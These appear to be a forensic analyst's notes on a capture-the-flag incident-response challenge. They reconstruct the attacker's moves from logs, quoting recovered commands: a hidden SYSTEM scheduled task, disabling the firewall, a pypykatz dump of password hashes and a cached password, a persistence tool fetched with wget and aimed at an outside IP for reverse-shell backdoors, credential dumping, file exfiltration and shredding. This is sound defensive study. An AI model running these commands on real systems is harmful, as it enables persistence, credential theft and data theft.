
**Previously in Prison Break**

- **When did the attacker access and read a txt file, which was probably the output of one of the tools they brought, due to the naming convention of the file?**
    *2025-08-20 10:08:06*
- The attacker created a persistence mechanism on the workstation. When was the persistence setup?
	*2025-08-20 10:13:57*

- When did the malicious RMM session end?
	*2025-08-20 10:14:27*

Parsing the disk image using Cape with the module `EZPasrer`

![[Pasted image 20260521020234.png]]

What was the first (non cd) command executed by the attacker on the host?
Last time the attacker moved laterally from the machine central cogwork to Heise-9
So we will hunt first the attacker logon event to correlate time because the last recorded time is 	*2025-08-20 10:14:27*

We search for remote successful logins of the  user Werni,  from the machine 10.129.242.110

`To Detail`


![[Pasted image 20260521033427.png]]

We notice that the authentification package was NTLM `Weak protocol` so teh attacker use tools that generate NTLM 


First Login of the user Werni on `2025-08-15 21:24:30`

Last Login was on  `2025-08-15 22:50`



searching FOR 4688 event id logs around the time of 2025-08-24 22:50
We find a proess called `WmiPrvSE.exe` ; some web searches explaint that WMi can cause CPU spikes.

Filtering for Parent Process = `WmiPrvSE.exe`
We find multiple suspicious commands that we will analyze meticulously


Analysing the cmd.exe process spawned under `WmiPrvSE.exe`

We isolate persistence commands


around 2025-08-24 23:00:15  to  2025-08-24 23:08:15

C:\Windows\System32\cmd.exe cmd.exe /Q /c cmd /C ""echo 10.129.242.110 NapoleonsBlackPearl.htb &gt;&gt; C:\Windows\System32\drivers\etc\hosts"" 
1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1",



"C:\Windows\System32\cmd.exe cmd.exe /Q /c schtasks /create /tn ""SysHelper Update"" /tr ""powershell -ExecutionPolicy Bypass -WindowStyle Hidden 
-File C:\Users\Werni\Appdata\Local\JM.ps1"" /sc minute /mo 2 /ru SYSTEM /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1"


C:\Windows\System32\cmd.exe cmd.exe /Q /c netsh advfirewall set allprofiles state off 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1



C:\Windows\System32\cmd.exe cmd.exe /Q /c reg add ""HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc"" 
v Start /t REG_DWORD /d 3 /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1",


PS C:\Users\PC\Downloads\Sherlocks\Holmes 3\EnduringEcho\C> Get-ChildItem -Recurse -Filter "JM.*"


    Répertoire : C:\Users\PC\Downloads\Sherlocks\Holmes3\EnduringEcho\C\Users\Werni\AppData\Local

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        21/05/2026     01:15           1225 JM.ps1



The Pwsh script explains that the password is in the format Watson_YYYYMMDDHHMMSS  
the creation time of the user svc_netupd is 2025-08-15 23:05:09



![[Pasted image 20260603022102.png]]
(config) PS C:\Users\PC\Downloads\Sherlocks\Holmes 3\EnduringEcho\C\Windows\System32\config> pypykatz registry --sam SAM --security SECURITY --software SOFTWARE SYSTEM

============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3a2999e73d3448fb21e14bbd9a9480d1
============== SAM hive secrets ==============
HBoot Key: 9d15e5b180f98af788be078107ba1e0c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:02679f6b636628c0822c7f9836b84282:::
Werni:1002:aad3b435b51404eeaad3b435b51404ee:0fa16c6a581bf468c6a83510926b8358:::
svc_netupd:1003:aad3b435b51404eeaad3b435b51404ee:532303a6fa70b02c905f950b60d7da51:::
============== SECURITY hive secrets ==============
Iteration count: 10240
Secrets structure format : VISTA
LSA Key: bbc4b1a4ec15b5f7eb3fe7bd64676e158f7490e7d8e137f4c1b7c771f5d4bede
NK$LM Key: 40000000000000000000000000000000ef3db78f87d755b7ef837202ba8573444a1c81e503da37c2d95460893622d175c7811ea1f60cd9ec65368e58bca57c1ffe1d9c4586f08223fd4760fbb221fcb8ec13e4b191bb4ee8617411894987122c
=== LSASecret CACHEDDEFAULTPASSWORD ===

History: True
Secret:
00000000:  57 00 65 00 6c 00 63 00  6f 00 6d 00 65 00 31 00   |W.e.l.c.o.m.e.1.|
=== LSA DPAPI secret ===
History: False
Machine key (hex): b5eb284702c6192c55d1a64faaac43c2a28ae137
User key(hex): b371dc89b1cdcaf5b6083d5e087a2c2af1d65b19
=== LSA DPAPI secret ===
History: True
Machine key (hex): ed8ba5aedd2b2f15f8dfab4e804da939f7f127b8
User key(hex): a8e080452d6e4fb5afb13c69f061c5cf86a805c6
=== LSASecret NL$KM ===

History: False
Secret:
00000000:  ef 3d b7 8f 87 d7 55 b7  ef 83 72 02 ba 85 73 44   |.=....U...r...sD|
00000010:  4a 1c 81 e5 03 da 37 c2  d9 54 60 89 36 22 d1 75   |J.....7..T`.6".u|
00000020:  c7 81 1e a1 f6 0c d9 ec  65 36 8e 58 bc a5 7c 1f   |........e6.X..|.|
00000030:  fe 1d 9c 45 86 f0 82 23  fd 47 60 fb b2 21 fc b8   |...E...#.G`..!..|
=== LSASecret NL$KM ===

History: True
Secret:
00000000:  ef 3d b7 8f 87 d7 55 b7  ef 83 72 02 ba 85 73 44   |.=....U...r...sD|
00000010:  4a 1c 81 e5 03 da 37 c2  d9 54 60 89 36 22 d1 75   |J.....7..T`.6".u|
00000020:  c7 81 1e a1 f6 0c d9 ec  65 36 8e 58 bc a5 7c 1f   |........e6.X..|.|
00000030:  fe 1d 9c 45 86 f0 82 23  fd 47 60 fb b2 21 fc b8   |...E...#.G`..!..|
============== SOFTWARE hive secrets ==============
default_logon_user: None
default_logon_domain: None
default_logon_password: None

## Timeline Events



| Time            | Event                                                                                                                                              | Evidence                                                                                                                        |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **10:39:28**    | The attacker Sucecssfully logged in using the credentials from the exfiltrated file  to `Heisen-9-WS-6` from `10.129.242.110`                      | TCP stream fragments `.131 → .136` containing `USER -f root` payload; resulting shell on `pts/1` with env `DISPLAY=kali:0.0`    |
| ~10:39–10:40    | Initial recon: `id`, `ps`, `cd /root; ls -la`                                                                                                      | Stream                                                                                                                          |
| ~10:42          |                                                                                                                                                    | New `/etc/shadow` entry; yescrypt hash; age field 20480 = 2026-01-27                                                            |
| ~10:42          | Credential dump: `cat /etc/shadow`                                                                                                                 | Full shadow file echoed in stream                                                                                               |
| ~10:43          | Filesystem enumeration: `/`, `/media`, `/dev`, `/opt`                                                                                              | `ls -la` output                                                                                                                 |
| ~10:43          | Sensitive file located: `/opt/credit-cards-25-blackfriday.db` (12 288 B, mtime 2026-01-26 14:05)                                                   | Directory listing                                                                                                               |
| **10:44:31–32** | Persistence tool fetched: `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh` to `/tmp`                        | wget output (34 249 B)                                                                                                          |
| ~10:45          | `bash linper.sh --enum-defenses` — Tripwire enumeration (none found)                                                                               | Tool output                                                                                                                     |
| ~10:45–10:46    | `bash linper.sh -i 91.99.25.54 -p 59 --stealth-mode` — multi-method persistence to `91.99.25.54:59` via awk, bash, nc, perl, pwsh, python3, telnet | Tool output: doors written to `/var/spool/cron/crontabs/root`, `/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/`, `/etc/rc.local` |
| ~10:46          | Timestomping of every modified persistence file                                                                                                    | linper output: "Timestomped Door" per file                                                                                      |
| ~10:49          | Exfil staging: `python3 -m http.server 6932` from `/opt`                                                                                           | "Serving HTTP on 0.0.0.0 port 6932"                                                                                             |
| **10:49:52**    | Attacker host `192.168.72.131` reaches listener (`GET /` → 200)                                                                                    | HTTP server access log                                                                                                          |
| **10:49:54**    | **Exfiltration:** `192.168.72.131 — GET /credit-cards-25-blackfriday.db → 200`                                                                     | HTTP server access log                                                                                                          |
| ~10:50          | HTTP server stopped (`Ctrl+C`)                                                                                                                     | Stream                                                                                                                          |
| ~10:53          | Anti-forensics: `shred -u -z -n 4 -- credit-cards-25-blackfriday.db`                                                                               | `ls -la /opt` confirms removal; `/opt` mtime updates to 10:53                                                                   |
| ~10:53          | Session terminated (`exit`)                                                                                                                        | Stream end                                                                                                                      |
##